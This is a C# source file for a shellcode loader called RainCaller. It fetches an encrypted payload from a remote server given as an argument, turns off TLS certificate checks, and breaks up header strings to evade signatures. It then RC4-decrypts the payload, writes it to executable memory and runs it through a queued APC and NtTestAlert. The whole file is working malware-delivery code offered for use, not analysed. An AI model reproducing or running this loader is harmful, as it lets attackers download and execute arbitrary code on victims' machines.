using System;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

using static RainCaller.Native;

namespace RainCaller
{
    public class RainCaller
    {
        //Override the default WebClient class -> setup a 5 second timeout
        //hxxps://stackoverflow.com/questions/1789627/how-to-change-the-timeout-on-a-net-webclient-object
        private class __WebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri uri)
            {
                WebRequest w = base.GetWebRequest(uri);
                w.Timeout = 5000;
                return w;
            }
        }

        //hxxps://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        private static byte[] RC4Crypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        private static byte[] RetrieveShellcode(string uri)
        {
            byte[] r = new byte[0];

            System.Net.ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

            using (var client = new __WebClient())
            {
                client.Headers.Add("Acce" + "pt-E" + "nco" + "di" + "ng", "gzi" + "p, de" + "fla" + "t" + "e");
                client.Headers.Add(HttpRequestHeader.Cookie, "CON" + "SE" + "NT=Y" + "ES"); //IOC
                try
                {
                    using (Stream data = client.OpenRead(uri))
                    using (var shellcode = new MemoryStream())
                    {
                        data.CopyTo(shellcode);
                        r = shellcode.ToArray();
                    }
                }
                catch
                {
                    Console.WriteLine("Failed to retrieve shellcode.");
                    System.Environment.Exit(-1);
                }
            }

            return r;
        }

        private static void Inject(byte[] _sc, string Rc4Key)
        {
            byte[] sc = RC4Crypt(Encoding.UTF8.GetBytes(Rc4Key), _sc);

            IntPtr scMem = Native.VirtualAlloc(IntPtr.Zero, (uint)sc.Length, Native.MEM_COMMIT, Native.PAGE_EXECUTE_READWRITE);
            if (scMem != IntPtr.Zero)
            {
                var bW = new IntPtr();
                if (Native.WriteProcessMemory(Process.GetCurrentProcess().Handle, scMem, sc, sc.Length, out bW))
                {
                    if (Native.QueueUserAPC(scMem, GetCurrentThread(), IntPtr.Zero) > 0)
                    {
                        Native.NtTestAlert();

                        uint oP = 0;
                        if (!Native.VirtualProtect(scMem, new UIntPtr((uint)sc.Length), Native.PAGE_READWRITE, out oP))
                            Console.WriteLine("Failed to restore the memory region back to RW permissions.");
                    }
                    else
                        Console.WriteLine("Failed to QueueUserAPC.");
                }
                else
                    Console.WriteLine("Failed to write shellcode to the memory region.");
            }
            else
                Console.WriteLine("Failed to allocate RWX memory.");

        }
        public static void Drop(string uri, string key)
        {
            Inject(RetrieveShellcode(uri), key);
        }
        static void Main(string[] args)
        {
            if (args.Length == 2)
                Drop(args[0], args[1]);
            else
                Console.WriteLine("RainCaller.exe <remote_server> <enc_key>");
        }
    }
}
